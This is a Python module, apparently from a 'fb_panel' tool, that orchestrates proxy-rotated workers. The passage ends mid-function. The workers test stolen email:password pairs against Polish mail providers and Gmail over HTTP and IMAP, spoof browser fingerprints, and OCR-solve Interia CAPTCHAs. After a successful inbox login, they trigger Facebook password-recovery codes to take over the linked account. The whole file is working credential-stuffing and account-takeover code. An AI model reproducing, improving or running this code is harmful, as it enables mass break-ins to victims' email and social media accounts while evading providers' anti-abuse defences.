# -*- coding: utf-8 -*-
"""Engine manager -- production worker orchestration.

Real features:
- Concurrent worker pool with semaphore
- Per-entry retry (max 2 retries with different proxy)
- Anti-connect: real SOCKS/HTTP re-validation before processing
- Worker lifecycle with status broadcast
- Graceful shutdown (cancel + await all workers)
- Proper proxy rotation + failure tracking
- Real Selenium integration OR simulation fallback
"""

import asyncio
import json
import logging
import random
import hashlib
import time
from typing import Optional, List, Set

from aiohttp import web

from server.models import LogEntry, LogStatus, WorkerInfo, WORKER_OS_OPTIONS
from server.managers.proxy_manager import ProxyManager
from server.managers.logs_manager import LogsManager
from server.managers.session_manager import SessionManager
from server.utils.stealth import (
    generate_profile, create_stealth_session, BrowserProfile,
    jitter, jitter_short, jitter_page, jitter_typing,
    _fix_dns_leak, CFFI_AVAILABLE,
)

try:
    from engine import (
        StealthSession, EngineConfig, EMAIL_PROVIDERS,
        HAS_SELENIUM, HAS_UC,
    )
    SELENIUM_AVAILABLE = HAS_SELENIUM
except ImportError:
    SELENIUM_AVAILABLE = False
    StealthSession = None
    EngineConfig = None
    EMAIL_PROVIDERS = {}

log = logging.getLogger("fb_panel.engine_manager")

MAX_RETRIES = 2

# -- PySocks availability check (needed for IMAP proxy tunneling) --
try:
    import socks as _socks_check
    PYSOCKS_AVAILABLE = True
except ImportError:
    PYSOCKS_AVAILABLE = False
    log.warning("[STARTUP] PySocks not installed -- IMAP proxy tunneling disabled. Run: pip install pysocks")


class EngineManager:
    """Production checker engine with concurrent workers and real-time WS broadcast."""

    def __init__(self, proxy_manager: ProxyManager, logs_manager: LogsManager, session_manager: SessionManager = None):
        self.proxy_manager = proxy_manager
        self.logs_manager = logs_manager
        self.session_manager = session_manager

        self.is_running = False
        self.concurrency = 3
        self.anti_connect = True
        self.workers: List[WorkerInfo] = []
        self._worker_id = 0
        self._task: Optional[asyncio.Task] = None
        self._active_tasks: Set[asyncio.Task] = set()
        self._ws_clients: Set[web.WebSocketResponse] = set()
        self._sem: Optional[asyncio.Semaphore] = None
        self._processed = 0
        self._started_at = 0

    # -- websocket ----------------------------------------------
    def add_ws(self, ws: web.WebSocketResponse):
        self._ws_clients.add(ws)

    def remove_ws(self, ws: web.WebSocketResponse):
        self._ws_clients.discard(ws)

    async def broadcast(self, event: str, data: dict):
        msg = json.dumps({"event": event, "data": data})
        dead = []
        for ws in list(self._ws_clients):
            try:
                await ws.send_str(msg)
            except Exception:
                dead.append(ws)
        for ws in dead:
            self._ws_clients.discard(ws)

    # -- start / stop -------------------------------------------
    async def start(self, concurrency: int = 3) -> dict:
        if self.is_running:
            return {"success": False, "error": "Already running"}
        self.concurrency = max(1, min(concurrency, 10))
        self._sem = asyncio.Semaphore(self.concurrency)
        self.is_running = True
        self._processed = 0
        self._started_at = time.time()
        self._task = asyncio.create_task(self._run_loop())
        await self.broadcast("engine_started", {"concurrency": self.concurrency})
        log.info(f"Engine started (concurrency={self.concurrency})")
        return {"success": True}

    async def stop(self) -> dict:
        if not self.is_running:
            return {"success": False, "error": "Not running"}
        self.is_running = False

        # Cancel main loop
        if self._task:
            self._task.cancel()
            try:
                await self._task
            except asyncio.CancelledError:
                pass

        # Cancel active worker tasks
        for task in list(self._active_tasks):
            task.cancel()
        if self._active_tasks:
            await asyncio.gather(*self._active_tasks, return_exceptions=True)
        self._active_tasks.clear()

        # Reset any entries still stuck in PROCESSING back to PENDING
        for entry in list(self.logs_manager.logs.values()):
            if entry.status == LogStatus.PROCESSING:
                self.logs_manager.update_status(entry.id, LogStatus.PENDING)

        # Clear workers
        self.workers.clear()

        await self.broadcast("engine_stopped", {"processed": self._processed})
        log.info(f"Engine stopped (processed {self._processed})")
        return {"success": True}

    # -- main loop ----------------------------------------------
    async def _run_loop(self):
        try:
            while self.is_running:
                pending = self.logs_manager.get_pending()
                if not pending:
                    # Check if all workers are done
                    if not self._active_tasks:
                        await asyncio.sleep(2)
                        # Re-check -- if still nothing, auto-stop
                        pending2 = self.logs_manager.get_pending()
                        if not pending2 and not self._active_tasks:
                            log.info("No more pending entries -- engine auto-stopping")
                            self.is_running = False
                            await self.broadcast("engine_stopped", {
                                "processed": self._processed,
                                "auto": True,
                            })
                            break
                    else:
                        await asyncio.sleep(1)
                    continue

                # Dispatch entries to workers in batches (max = concurrency * 2)
                batch_size = self.concurrency * 2
                dispatched = 0
                for entry in pending:
                    if not self.is_running:
                        break
                    if dispatched >= batch_size:
                        break
                    # Mark as processing immediately to prevent re-dispatch
                    self.logs_manager.update_status(entry.id, LogStatus.PROCESSING)
                    task = asyncio.create_task(self._worker_task(entry))
                    self._active_tasks.add(task)
                    task.add_done_callback(self._active_tasks.discard)
                    dispatched += 1

                await self._broadcast_stats()
                await asyncio.sleep(0.5)

        except asyncio.CancelledError:
            pass
        except Exception as e:
            log.error(f"Engine loop error: {e}")
            self.is_running = False

    async def _worker_task(self, entry: LogEntry):
        """Single worker task -- acquires semaphore slot, processes entry with retry."""
        async with self._sem:
            await self._process_entry_with_retry(entry)

    async def _broadcast_stats(self):
        stats = self.logs_manager.get_stats()
        stats["processed_total"] = self._processed
        uptime = int(time.time() - self._started_at) if self._started_at else 0
        stats["uptime"] = uptime
        await self.broadcast("stats_update", stats)

    # -- entry processing with retry ----------------------------
    async def _process_entry_with_retry(self, entry: LogEntry):
        for attempt in range(1, MAX_RETRIES + 1):
            if not self.is_running:
                # Reset to PENDING so it can be retried after restart
                self.logs_manager.update_status(entry.id, LogStatus.PENDING)
                return
            result = await self._process_entry(entry, attempt)
            if result != "RETRY":
                self._processed += 1
                await self._broadcast_stats()
                return
            if attempt < MAX_RETRIES:
                log.info(f"Retrying {entry.email} (attempt {attempt + 1}/{MAX_RETRIES})")
                await asyncio.sleep(1)

        # All retries exhausted
        self._processed += 1
        self.logs_manager.update_status(entry.id, LogStatus.ERROR, error="Max retries exceeded")
        await self.broadcast("log_updated", self.logs_manager.logs[entry.id].to_dict())
        await self._broadcast_stats()

    async def _process_entry(self, entry: LogEntry, attempt: int = 1) -> str:
        """Process a single entry: get proxy, validate, check email, lookup FB."""
        worker = self._spawn_worker(entry)
        entry.worker_id = worker.id
        self.logs_manager.update_status(entry.id, LogStatus.PROCESSING, worker_os=worker.os)
        await self.broadcast("worker_update", worker.to_dict())
        await self.broadcast("log_updated", self.logs_manager.logs[entry.id].to_dict())

        proxy = None
        try:
            # -- Get proxy --
            proxy = self.proxy_manager.get_next()
            if proxy:
                entry.proxy = proxy.url  # Full URL: socks5://user:pass@host:port
                worker.proxy = f"{proxy.address}:{proxy.port}"
                worker.status = "validating_proxy"
                await self.broadcast("worker_update", worker.to_dict())

                # Anti-connect: re-validate proxy with real protocol test
                if self.anti_connect:
                    alive = await self.proxy_manager.recheck_proxy(proxy)
                    if not alive:
                        self.proxy_manager.mark_failed(f"{proxy.address}:{proxy.port}")
                        # Try another proxy
                        proxy = self.proxy_manager.get_next()
                        if proxy:
                            entry.proxy = proxy.url
                            worker.proxy = f"{proxy.address}:{proxy.port}"
                        else:
                            self.logs_manager.update_status(entry.id, LogStatus.ERROR, error="No working proxy")
                            await self.broadcast("log_updated", self.logs_manager.logs[entry.id].to_dict())
                            self._despawn_worker(worker.id)
                            return "RETRY"

                worker.status = "connecting_proxy"
                await self.broadcast("worker_update", worker.to_dict())
            else:
                # No proxy available -- process without proxy
                entry.proxy = None
                worker.proxy = "direct"

            # -- Process --
            # Always use HTTP API checker (faster, stealthier, no browser needed)
            # Selenium is only used AFTER checking to open inbox + FB reset tabs
            worker.status = "processing"
            await self.broadcast("worker_update", worker.to_dict())
            await self.broadcast("log_updated", entry.to_dict())

            result = await self._process_simulated(entry, worker)

            worker.status = "done"
            await self.broadcast("worker_update", worker.to_dict())
            return result

        except asyncio.CancelledError:
            # On cancel, reset to PENDING so entry is not orphaned
            self.logs_manager.update_status(entry.id, LogStatus.PENDING)
            raise
        except Exception as e:
            log.error(f"Worker error for {entry.email}: {e}")
            self.logs_manager.update_status(entry.id, LogStatus.ERROR, error=str(e)[:100], worker_os=worker.os)
            await self.broadcast("log_updated", self.logs_manager.logs[entry.id].to_dict())
            return "RETRY"
        finally:
            self._despawn_worker(worker.id)

    # -- Selenium processing ------------------------------------
    async def _process_with_selenium(self, entry: LogEntry, worker: WorkerInfo, proxy=None) -> str:
        domain = entry.email.split("@")[-1].lower() if "@" in entry.email else ""
        provider = EMAIL_PROVIDERS.get(domain)

        if not provider:
            self.logs_manager.update_status(
                entry.id, LogStatus.ERROR,
                error=f"Unsupported provider: {domain}", worker_os=worker.os,
            )
            await self.broadcast("log_updated", self.logs_manager.logs[entry.id].to_dict())
            return "OK"

        session_id = hashlib.md5(f"{entry.email}:{time.time()}".encode()).hexdigest()[:16]
        config = EngineConfig(headless=True, stealth_mode=True, human_typing=True)
        proxy_str = entry.proxy if entry.proxy else None
        session = StealthSession(session_id=session_id, config=config, proxy=proxy_str)

        loop = asyncio.get_event_loop()

        try:
            worker.status = "connecting_proxy"
            await self.broadcast("worker_update", worker.to_dict())

            started = await loop.run_in_executor(None, self._sync_start_session, session)
            if not started:
                # Browser couldn't launch -- signal fallback to simulation
                return "BROWSER_FAIL"

            worker.status = "processing"
            await self.broadcast("worker_update", worker.to_dict())

            success, code_or_error = await loop.run_in_executor(
                None, self._sync_login_and_extract, session, entry.email, entry.password, provider,
            )

            if success:
                self.logs_manager.update_status(entry.id, LogStatus.SUCCESS, worker_os=worker.os)
                log.info(f"✓ {entry.email} -> zalogowano")
            else:
                reason = str(code_or_error) if code_or_error else "unknown"
                if reason == "CHECKPOINT":
                    self.logs_manager.update_status(entry.id, LogStatus.CHECKPOINT, worker_os=worker.os)
                elif reason == "2FA_REQUIRED":
                    self.logs_manager.update_status(entry.id, LogStatus.TWO_FA, worker_os=worker.os)
                else:
                    self.logs_manager.update_status(entry.id, LogStatus.INVALID, error=reason, worker_os=worker.os)

        except asyncio.CancelledError:
            raise
        except Exception as e:
            log.error(f"Selenium error for {entry.email}: {e}")
            self.logs_manager.update_status(entry.id, LogStatus.ERROR, error=str(e)[:100], worker_os=worker.os)
            return "RETRY"
        finally:
            try:
                session.close()
            except Exception:
                pass

        await self.broadcast("log_updated", self.logs_manager.logs[entry.id].to_dict())
        return "OK"

    @staticmethod
    def _sync_start_session(session) -> bool:
        import asyncio as _aio
        try:
            loop = _aio.new_event_loop()
            result = loop.run_until_complete(session.start())
            loop.close()
            return result
        except Exception as e:
            log.error(f"_sync_start error: {e}")
            return False

    @staticmethod
    def _sync_login_and_extract(session, email, password, provider):
        import asyncio as _aio
        try:
            loop = _aio.new_event_loop()
            result = loop.run_until_complete(session.login_email(email, password, provider))
            loop.close()
            return result
        except Exception as e:
            log.error(f"_sync_login error: {e}")
            return (False, str(e))

    # -- Simulation fallback ------------------------------------
    async def _process_simulated(self, entry: LogEntry, worker: WorkerInfo) -> str:
        """Real email login check (HTTP/IMAP) + Facebook account lookup + 8-code."""
        domain = entry.email.split("@")[-1].lower() if "@" in entry.email else "unknown"

        # -- Step 1: Check email login --
        worker.current_step = "email_login"
        await self.broadcast("worker_update", worker.to_dict())

        # Proxy URL comes from ProxyEntry.url (already full URL: socks5://host:port etc.)
        proxy_url = entry.proxy if entry.proxy else None
        if proxy_url:
            proxy_url = _fix_dns_leak(proxy_url)
            log.info(f"[PROXY] {entry.email} -> using proxy (dns-safe)")

        # Generate unique browser fingerprint for this entry
        profile = generate_profile()
        log.debug(f"[STEALTH] {entry.email} -> {profile.user_agent[:60]}...")

        loop = asyncio.get_event_loop()
        email_result = await loop.run_in_executor(
            None, self._check_email_login, entry.email, entry.password, proxy_url, profile
        )
        status = email_result["status"]  # "success" / "invalid" / "pass_change" / "blocked" / "unknown"
        detail = email_result.get("detail", "")

        if status == "invalid":
            err_msg = f"Nieprawidłowe dane logowania · {domain}"
            self.logs_manager.update_status(entry.id, LogStatus.INVALID, error=err_msg, worker_os=worker.os)
            log.info(f"✗ {entry.email} -> nieprawidłowe dane ({domain})")
            await self.broadcast("log_updated", self.logs_manager.logs[entry.id].to_dict())
            return "OK"

        if status == "blocked":
            err_msg = f"Konto zablokowane · {domain}"
            self.logs_manager.update_status(entry.id, LogStatus.ERROR, error=err_msg, worker_os=worker.os)
            log.info(f"✗ {entry.email} -> konto zablokowane ({domain})")
            await self.broadcast("log_updated", self.logs_manager.logs[entry.id].to_dict())
            return "OK"

        if status == "pass_change":
            err_msg = f"Wymagana zmiana hasła · {domain}"
            self.logs_manager.update_status(entry.id, LogStatus.CHECKPOINT, error=err_msg, worker_os=worker.os)
            log.info(f"⚠ {entry.email} -> wymaga zmiany hasła ({domain})")
            await self.broadcast("log_updated", self.logs_manager.logs[entry.id].to_dict())
            return "OK"

        if status == "unknown":
            # Could not verify email -- retry with different proxy instead of faking result
            err_msg = f"Nie udało się zweryfikować danych · {domain}"
            if detail:
                err_msg += f" ({detail})"
            self.logs_manager.update_status(entry.id, LogStatus.ERROR, error=err_msg, worker_os=worker.os)
            log.info(f"? {entry.email} -> nie udało się zweryfikować ({domain}: {detail})")
            await self.broadcast("log_updated", self.logs_manager.logs[entry.id].to_dict())
            return "RETRY"

        # -- Step 2: Email login SUCCESS -> Facebook account lookup + 8-code --
        log.info(f"✓ {entry.email} -> zalogowano na pocztę ({domain})")

        worker.current_step = "fb_lookup"
        await self.broadcast("worker_update", worker.to_dict())

        fb_result = await loop.run_in_executor(
            None, self._facebook_lookup_and_code, entry.email, proxy_url, profile
        )
        fb_status = fb_result["status"]  # "code_sent" / "not_found" / "disabled" / "error"

        if fb_status == "code_sent":
            code = fb_result.get("code_digits", "8")
            sms_info = fb_result.get("sms", "")
            recover_url = fb_result.get("recover_url", "https://mbasic.facebook.com/recover/code/")
            self.logs_manager.update_status(
                entry.id, LogStatus.SUCCESS,
                code=f"FB-{code}D", worker_os=worker.os
            )
            # Store recover_url on the log entry so session panel can use it later
            entry.recover_url = recover_url
            log.info(f"OK {entry.email} -> FB kod wyslany ({code}-cyfrowy){' SMS: ' + sms_info if sms_info else ''}")
        elif fb_status == "not_found":
            self.logs_manager.update_status(
                entry.id, LogStatus.SUCCESS,
                code="NO-FB", worker_os=worker.os,
                error=f"Zalogowano · {domain} · Brak konta FB"
            )
            log.info(f"✓ {entry.email} -> poczta OK, brak konta FB")
        elif fb_status == "disabled":
            self.logs_manager.update_status(
                entry.id, LogStatus.SUCCESS,
                code="FB-OFF", worker_os=worker.os,
                error=f"Zalogowano · {domain} · Konto FB wyłączone"
            )
            log.info(f"✓ {entry.email} -> poczta OK, konto FB wyłączone")
        else:
            # FB lookup failed but email was valid
            self.logs_manager.update_status(
                entry.id, LogStatus.SUCCESS, worker_os=worker.os,
                error=f"Zalogowano · {domain} · FB: błąd sprawdzania"
            )
            log.info(f"✓ {entry.email} -> poczta OK, FB błąd: {fb_result.get('detail', '?')}")

        await self.broadcast("log_updated", self.logs_manager.logs[entry.id].to_dict())
        return "OK"

    # -- Email login check -------------------------------------
    # WP Group domains (WP.pl, O2.pl, Tlen.pl) - 2-stage:
    #   1. HTTP API: POST /login/v1/token -> 303 redirect with result in Location
    #   2. IMAP fallback: imap.wp.pl:993 / poczta.o2.pl:993
    # Other domains: IMAP only

    @staticmethod
    def _build_proxy_url(proxy_str: str) -> str:
        """Convert proxy string to URL for requests library.

        Accepts: full URL (socks5://..., http://...) or 'host:port' / 'user:pass@host:port'.
        Returns: full proxy URL with DNS-safe protocol (socks5h instead of socks5).
        """
        if not proxy_str:
            return None
        # Already a full URL -> fix DNS leak
        if "://" in proxy_str:
            return _fix_dns_leak(proxy_str)
        # Bare host:port -> default to socks5h (DNS-safe)
        return f"socks5h://{proxy_str}"

    @staticmethod
    def _create_proxy_socket(proxy_url: str, dest_host: str, dest_port: int, timeout: int = 10):
        """Create a TCP socket tunneled through SOCKS5/SOCKS4/HTTP proxy.

        Uses PySocks (socks library). Returns None if unavailable.
        """
        if not PYSOCKS_AVAILABLE:
            log.warning("[PROXY] PySocks not installed -- IMAP proxy tunnel unavailable. pip install pysocks")
            return None
        try:
            import socks
            from urllib.parse import urlparse

            parsed = urlparse(proxy_url)
            scheme = (parsed.scheme or "socks5").lower()

            proxy_type_map = {
                "socks5": socks.SOCKS5,
                "socks5h": socks.SOCKS5,
                "socks4": socks.SOCKS4,
                "socks4a": socks.SOCKS4,
                "http": socks.HTTP,
                "https": socks.HTTP,
            }
            proxy_type = proxy_type_map.get(scheme, socks.SOCKS5)

            proxy_host = parsed.hostname
            proxy_port = parsed.port or 1080
            proxy_user = parsed.username
            proxy_pass = parsed.password

            sock = socks.socksocket()
            sock.settimeout(timeout)
            sock.set_proxy(proxy_type, proxy_host, proxy_port,
                           rdns=True,  # Resolve DNS on proxy side (prevent DNS leak)
                           username=proxy_user, password=proxy_pass)
            sock.connect((dest_host, dest_port))
            return sock
        except Exception as e:
            log.warning(f"[PROXY] Failed to create proxy socket to {dest_host}:{dest_port} via {proxy_url}: {e}")
            return None

    # Domain -> HTTP base URL for WP Group login API
    _HTTP_DOMAINS = {
        "wp.pl": "https://poczta.wp.pl",
        "o2.pl": "https://poczta.o2.pl",
        "tlen.pl": "https://poczta.o2.pl",
        "go2.pl": "https://poczta.o2.pl",
    }

    # Interia domains handled via auth.interia.pl OAuth2
    _INTERIA_DOMAINS = {"interia.pl", "poczta.interia.pl"}

    # Domain -> (field_name_for_username, login_page_path)
    _WP_BRAND_CONFIG = {
        "wp.pl":   ("login_username", "/login/login.html"),
        "o2.pl":   ("username",       "/login/login.html"),
        "tlen.pl": ("username",       "/login/login.html"),
        "go2.pl":  ("username",       "/login/login.html"),
    }

    # Domain -> IMAP server
    _IMAP_SERVERS = {
        # WP Group (fallback)
        "wp.pl": "imap.wp.pl",
        "o2.pl": "poczta.o2.pl",
        "tlen.pl": "imap.tlen.pl",
        # Interia / Onet
        "interia.pl": "imap.interia.pl",
        "poczta.interia.pl": "imap.interia.pl",
        "onet.pl": "imap.poczta.onet.pl",
        "op.pl": "imap.poczta.onet.pl",
        "vp.pl": "imap.poczta.onet.pl",
        # Gmail
        "gmail.com": "imap.gmail.com",
    }

    @staticmethod
    def _check_email_login(email: str, password: str, proxy_url: str = None, profile: BrowserProfile = None) -> dict:
        """Check email credentials.

        Returns dict with 'status': success / invalid / pass_change / blocked / unknown
        For WP/O2 domains: tries HTTP API first, then IMAP fallback.
        For Interia: tries auth.interia.pl OAuth2 API first, then IMAP fallback.
        All requests go through proxy_url when provided.
        Profile provides consistent browser fingerprint for the entire session.
        """
        if not profile:
            profile = generate_profile()
        domain = email.split("@")[-1].lower() if "@" in email else ""

        # -- Interia domains -> auth.interia.pl OAuth2 --
        if domain in EngineManager._INTERIA_DOMAINS:
            result = EngineManager._check_email_interia(email, password, proxy_url, profile)
            if result["status"] != "unknown":
                return result
            log.info(f"[INTERIA] {email} -> inconclusive ({result.get('detail')}), trying IMAP fallback")
            imap_result = EngineManager._check_email_imap(email, password, domain, proxy_url)
            if imap_result["status"] != "unknown":
                return imap_result
            return result

        # -- WP/O2 domains -> poczta.wp.pl / poczta.o2.pl API --
        base_url = EngineManager._HTTP_DOMAINS.get(domain)
        if base_url:
            result = EngineManager._check_email_http(email, password, base_url, domain, proxy_url, profile)
            if result["status"] != "unknown":
                return result
            log.info(f"[HTTP] {email} -> inconclusive ({result.get('detail')}), trying IMAP fallback")
            imap_result = EngineManager._check_email_imap(email, password, domain, proxy_url)
            if imap_result["status"] != "unknown":
                return imap_result
            return result

        # -- Other domains -- IMAP only --
        return EngineManager._check_email_imap(email, password, domain, proxy_url)

    # -- Interia OAuth2 login checker ---------------------------
    @staticmethod
    def _check_email_interia(email: str, password: str, proxy_url: str = None, profile: BrowserProfile = None) -> dict:
        """Interia.pl login via auth.interia.pl OAuth2 endpoint.

        Flow: POST https://auth.interia.pl/auth  ->  303 redirect
          Location contains  error=invalid_credentials  -> invalid
          Location contains  error=...                  -> other error (captcha, locked, etc.)
          Location contains  code=...  (no error)       -> success (valid credentials)

        Uses PKCE (S256) code_challenge for OAuth2 compatibility.
        If CAPTCHA is required, tries OCR-based solving (pytesseract + Pillow).
        """
        import uuid
        import base64
        import os
        from urllib.parse import urlparse, parse_qs, quote

        if not profile:
            profile = generate_profile()

        # -- Generate PKCE code_challenge --
        code_verifier = base64.urlsafe_b64encode(os.urandom(32)).rstrip(b"=").decode()
        challenge_digest = hashlib.sha256(code_verifier.encode()).digest()
        code_challenge = base64.urlsafe_b64encode(challenge_digest).rstrip(b"=").decode()

        device_uuid = str(uuid.uuid4())

        captcha_res = ""

        # -- Try to detect & solve CAPTCHA before login attempt --
        try:
            import pytesseract
            from PIL import Image
            import io as _io
            import re as _re
            _has_ocr = True
        except ImportError:
            _has_ocr = False

        def _try_solve_captcha(session_obj, hdrs):
            """Attempt to fetch login page, find captcha image, OCR it.
            Returns captcha solution string or empty string."""
            if not _has_ocr:
                return ""
            try:
                # Load the login page to get CAPTCHA
                page_resp = session_obj.get(
                    "https://poczta.interia.pl/logowanie",
                    headers={k: v for k, v in hdrs.items() if k != "Content-Type"},
                    timeout=15,
                )
                page_html = page_resp.text or ""

                # Find CAPTCHA image URL in page source
                # Interia captcha URLs: /captcha/..., /getCaptcha, etc.
                captcha_url = None
                import re as _re2
                patterns = [
                    r'<img[^>]+src=["\']([^"\']*captcha[^"\']*)["\']',
                    r'<img[^>]+src=["\']([^"\']*getCaptcha[^"\']*)["\']',
                    r'<img[^>]+src=["\']([^"\']*get_captcha[^"\']*)["\']',
                ]
                for pat in patterns:
                    m = _re2.search(pat, page_html, _re2.IGNORECASE)
                    if m:
                        captcha_url = m.group(1)
                        break

                if not captcha_url:
                    return ""

                # Make absolute URL
                if captcha_url.startswith("/"):
                    captcha_url = "https://poczta.interia.pl" + captcha_url
                elif not captcha_url.startswith("http"):
                    captcha_url = "https://poczta.interia.pl/" + captcha_url

                log.info(f"[INTERIA] CAPTCHA image URL: {captcha_url}")

                # Download CAPTCHA image
                img_resp = session_obj.get(captcha_url, timeout=10)
                if img_resp.status_code != 200 or not img_resp.content:
                    return ""

                # OCR
                img = Image.open(_io.BytesIO(img_resp.content))
                img = img.convert('L')
                w, h = img.size
                img = img.resize((w * 2, h * 2), Image.LANCZOS)
                img = img.point(lambda px: 255 if px > 140 else 0, '1')
                config = '--psm 7 -c tessedit_char_whitelist=0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
                text = pytesseract.image_to_string(img, config=config).strip()
                text = _re.sub(r'[^a-zA-Z0-9]', '', text)
                if text and len(text) >= 3:
                    log.info(f"[INTERIA] CAPTCHA OCR result: '{text}'")
                    return text

                # Retry with different threshold
                img2 = Image.open(_io.BytesIO(img_resp.content)).convert('L')
                img2 = img2.resize((w * 3, h * 3), Image.LANCZOS)
                img2 = img2.point(lambda px: 255 if px > 100 else 0, '1')
                text2 = pytesseract.image_to_string(img2, config=config).strip()
                text2 = _re.sub(r'[^a-zA-Z0-9]', '', text2)
                if text2 and len(text2) >= 3:
                    log.info(f"[INTERIA] CAPTCHA OCR result (retry): '{text2}'")
                    return text2

                return ""
            except Exception as e:
                log.warning(f"[INTERIA] CAPTCHA solve error: {e}")
                return ""

        def _do_login_attempt(session_obj, hdrs, captcha_value=""):
            """Perform the actual OAuth2 login POST. Returns (status_code, location)."""
            form = {
                "email": email,
                "password": password,
                "captchaRes": captcha_value,
                "client_id": "8efab5b8fe052033a91adaf38ca5b4c0",
                "code_challenge_method": "S256",
                "code_challenge": code_challenge,
                "grant_type": "password",
                "response_type": "code",
                "scope": "email basic login",
                "redirect_uri": "https://poczta.interia.pl/logowanie/sso/login",
                "deviceUuid": device_uuid,
                "crc": "",
                "referer": "",
                "failedLogginAttempt": "1",
            }
            resp = session_obj.post(
                "https://auth.interia.pl/auth",
                data=form,
                headers=hdrs,
                allow_redirects=False,
                timeout=15,
            )
            return resp.status_code, resp.headers.get("Location", "")

        headers = profile.base_headers(
            origin="https://poczta.interia.pl",
            referer="https://poczta.interia.pl/",
            content_type="application/x-www-form-urlencoded",
        )
        headers["Sec-Fetch-Site"] = "same-site"

        try:
            jitter_typing(len(email) + len(password))

            session = create_stealth_session(profile, proxy_url)

            # First attempt — without CAPTCHA
            status_code, location = _do_login_attempt(session, headers, "")
            log.info(f"[INTERIA] {email} -> {status_code} location={location[:120]}")

            if status_code not in (301, 302, 303, 307, 308) or not location:
                if status_code == 429:
                    return {"status": "unknown", "detail": "rate_limited"}
                if status_code == 403:
                    return {"status": "unknown", "detail": "blocked_by_waf"}
                return {"status": "unknown", "detail": f"interia_http_{status_code}_no_redirect"}

            parsed = urlparse(location)
            params = parse_qs(parsed.query)
            error = params.get("error", [None])[0]
            error_desc = params.get("error_description", [None])[0]
            error_desc_lower = (error_desc or "").lower()

            captcha_hints = ["obrazka", "captcha", "kod z", "przepisz"]
            captcha_in_desc = any(hint in error_desc_lower for hint in captcha_hints)

            # -- If CAPTCHA required, try OCR solve and retry --
            if error and (captcha_in_desc or error in ("captcha_required", "captcha")):
                log.info(f"[INTERIA] {email} -> CAPTCHA required, attempting OCR solve...")
                for attempt in range(3):
                    solved = _try_solve_captcha(session, headers)
                    if not solved:
                        log.warning(f"[INTERIA] CAPTCHA OCR attempt {attempt+1} failed")
                        continue

                    log.info(f"[INTERIA] Retrying login with CAPTCHA solution: '{solved}'")
                    status_code, location = _do_login_attempt(session, headers, solved)
                    log.info(f"[INTERIA] {email} -> retry {status_code} location={location[:120]}")

                    if status_code not in (301, 302, 303, 307, 308) or not location:
                        continue

                    parsed = urlparse(location)
                    params = parse_qs(parsed.query)
                    error = params.get("error", [None])[0]
                    error_desc = params.get("error_description", [None])[0]
                    error_desc_lower = (error_desc or "").lower()
                    captcha_in_desc = any(hint in error_desc_lower for hint in captcha_hints)

                    if not error:
                        # CAPTCHA solved + login OK
                        break
                    if error == "invalid_credentials" and not captcha_in_desc:
                        # CAPTCHA solved but password wrong
                        break
                    # Still CAPTCHA — retry

            if error:
                if error == "invalid_credentials":
                    if captcha_in_desc:
                        log.info(f"[INTERIA] {email} -> CAPTCHA not solved after retries")
                        return {"status": "unknown", "detail": "interia_captcha_required"}
                    log.info(f"[INTERIA] {email} -> INVALID ({error_desc or error})")
                    return {"status": "invalid", "detail": f"interia_invalid: {error_desc or error}"}
                if error in ("account_locked", "account_blocked", "blocked"):
                    log.info(f"[INTERIA] {email} -> BLOCKED ({error_desc or error})")
                    return {"status": "blocked", "detail": f"interia_blocked: {error_desc or error}"}
                if error in ("captcha_required", "captcha"):
                    log.info(f"[INTERIA] {email} -> CAPTCHA required")
                    return {"status": "unknown", "detail": "interia_captcha_required"}
                if "password" in error.lower() or "pass" in error.lower():
                    log.info(f"[INTERIA] {email} -> PASS_CHANGE ({error_desc or error})")
                    return {"status": "pass_change", "detail": f"interia_pass_change: {error_desc or error}"}
                # Unknown error type
                log.warning(f"[INTERIA] {email} -> unknown error: {error} ({error_desc})")
                return {"status": "unknown", "detail": f"interia_error: {error}={error_desc}"}

            # -- No error in redirect -> valid credentials --
            # Valid login redirects to SSO callback without error params
            # e.g. /logowanie/sso/login?code=...
            code = params.get("code", [None])[0]
            if code or "sso/login" in location:
                log.info(f"[INTERIA] {email} -> SUCCESS (OAuth2 code received)")
                return {"status": "success", "detail": "interia_login_ok"}

            # Redirect without error and without code -- likely success path
            log.info(f"[INTERIA] {email} -> likely SUCCESS (no error in redirect: {location[:80]})")
            return {"status": "success", "detail": "interia_redirect_no_error"}

        except Exception as e:
            err_str = str(e).lower()
            if "timeout" in err_str:
                log.warning(f"[INTERIA] Timeout for {email}")
                return {"status": "unknown", "detail": "interia_timeout"}
            if "connection" in err_str or "connect" in err_str:
                log.warning(f"[INTERIA] Connection error for {email}: {e}")
                return {"status": "unknown", "detail": "interia_connection_error"}
            log.warning(f"[INTERIA] Error for {email}: {e}")
            return {"status": "unknown", "detail": f"interia_error: {str(e)[:100]}"}

    @staticmethod
    def _check_email_http(email: str, password: str, base_url: str, domain: str,
                          proxy_url: str = None, profile: BrowserProfile = None) -> dict:
        """WP.pl / O2.pl login via real HTTP API: POST /login/v1/token."""
        from urllib.parse import quote

        if not profile:
            profile = generate_profile()

        brand_cfg = EngineManager._WP_BRAND_CONFIG.get(domain, ("login_username", "/login/login.html"))
        username_field, login_page = brand_cfg

        session = create_stealth_session(profile, proxy_url)

        try:
            # Step 1: GET login page -> establish session cookies
            jitter_short()
            r0 = session.get(f"{base_url}{login_page}", timeout=10)
            log.debug(f"[HTTP] {email} -> login page {r0.status_code}")

            # Step 2: POST credentials (simulate typing delay)
            jitter_typing(len(email) + len(password))

            form_data = f"{username_field}={quote(email)}&password={quote(password)}"
            post_headers = profile.base_headers(
                origin=base_url,
                referer=f"{base_url}{login_page}",
                content_type="application/x-www-form-urlencoded",
            )

            resp = session.post(
                f"{base_url}/login/v1/token",
                data=form_data,
                headers=post_headers,
                allow_redirects=False,
                timeout=15,
            )

            status_code = resp.status_code
            location = resp.headers.get("Location", "")
            log.info(f"[HTTP] {email} -> {status_code} location={location}")

            if status_code in (301, 302, 303, 307, 308) and location:
                return EngineManager._parse_wp_redirect(location, base_url, email,
                                                         proxy_url, session, profile)

            if status_code == 200:
                ct = resp.headers.get("Content-Type", "")
                if "json" in ct:
                    try:
                        data = resp.json()
                        if data.get("status") == "ok" or data.get("success"):
                            return {"status": "success", "detail": "json_ok"}
                        if data.get("error") or data.get("status") == "error":
                            err = str(data.get("error", data.get("message", "")))
                            if "bad_login" in err or "invalid" in err.lower():
                                return {"status": "invalid", "detail": f"json_error: {err}"}
                            return {"status": "unknown", "detail": f"json: {err}"}
                    except Exception:
                        pass
                if any(k for k in session.cookies.keys() if k.lower() in ("wp_sid", "sid", "token")):
                    return {"status": "success", "detail": "session_cookie"}
